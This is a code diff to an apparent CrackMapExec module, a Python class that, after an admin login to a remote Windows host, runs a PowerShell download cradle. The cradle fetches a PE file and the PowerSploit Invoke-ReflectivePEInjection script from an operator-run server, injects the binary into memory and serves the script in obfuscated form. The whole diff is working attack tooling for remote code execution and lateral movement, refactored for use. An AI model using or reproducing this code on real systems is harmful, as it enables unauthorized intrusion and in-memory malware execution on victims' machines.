@@ -38,10 +38,11 @@ class CMEModule:
         if 'EXEARGS' in module_options:
             self.exeargs = module_options['EXEARGS']
 
+        self.ps_script = obfs_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1')
+
     def on_admin_login(self, context, connection):
  
         payload = """
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-ReflectivePEInjection.ps1');
         $WebClient = New-Object System.Net.WebClient;
         [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{pefile}');
         Invoke-ReflectivePEInjection -PEBytes $bytes""".format(server=context.server,
@@ -55,9 +56,10 @@ class CMEModule:
         if self.exeargs:
             payload += ' -ExeArgs "{}"'.format(self.exeargs)
 
-        context.log.debug('Payload:{}'.format(payload))
-        payload = create_ps_command(payload, force_ps32=True)
-        connection.execute(payload)
+        launcher = gen_ps_iex_cradle(context, 'Invoke-ReflectivePEInjection.ps1', payload, post_back=False)
+
+        ps_command = create_ps_command(launcher, force_ps32=True)
+        connection.execute(ps_command)
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
@@ -65,9 +67,7 @@ class CMEModule:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read())
-                request.wfile.write(ps_script)
+            request.wfile.write(self.ps_script)
 
         elif os.path.basename(self.payload_path) == request.path[1:]:
             request.send_response(200)
